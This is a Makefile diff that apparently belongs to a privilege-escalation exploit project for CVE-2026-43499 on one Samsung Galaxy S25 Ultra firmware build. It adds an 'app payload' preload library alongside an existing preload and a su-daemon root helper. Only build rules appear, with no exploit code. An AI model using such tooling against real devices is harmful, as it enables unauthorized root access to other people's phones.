@@ -9,12 +9,22 @@ $(error set ANDROID_NDK_HOME to an Android NDK containing $(TARGET_CC))
 endif
 
 PRELOAD := $(OUTDIR)/cve-2026-43499
+APP_PRELOAD := $(OUTDIR)/cve-2026-43499-app.so
 ROOT_HELPER := $(OUTDIR)/cve-2026-43499-root
 
 PRELOAD_SRCS := \
   src/main.c \
   src/util.c \
   src/slide.c \
+  src/fops.c \
+  src/pipe.c \
+  src/root.c \
+  src/preload.c
+
+APP_PRELOAD_SRCS := \
+  src/main.c \
+  src/util.c \
+  src/slide_app.c \
   src/fops.c \
   src/pipe.c \
   src/root.c \
@@ -29,7 +39,7 @@ COMMON_CFLAGS := \
 
 .PHONY: all clean info
 
-all: $(PRELOAD) $(ROOT_HELPER)
+all: $(PRELOAD) $(APP_PRELOAD) $(ROOT_HELPER)
 
 $(OUTDIR):
 	mkdir -p $@
@@ -43,10 +53,16 @@ $(ROOT_HELPER): src/su_daemon.c | $(OUTDIR)
 	$(TARGET_CC) -fPIE -pie -O2 -g0 -Wall -Wextra $< -o $@
 	sha256sum $@
 
+$(APP_PRELOAD): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
+	$(TARGET_CC) -DAPP_PAYLOAD=1 -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
+	  -shared -pthread -o $@
+	sha256sum $@
+
 info:
 	@echo "TARGET=Samsung Galaxy S25 Ultra SM-S938N S938NKSUACZF1"
 	@echo "TARGET_CC=$(TARGET_CC)"
 	@echo "PRELOAD=$(PRELOAD)"
+	@echo "APP_PRELOAD=$(APP_PRELOAD)"
 	@echo "ROOT_HELPER=$(ROOT_HELPER)"
 
 clean:
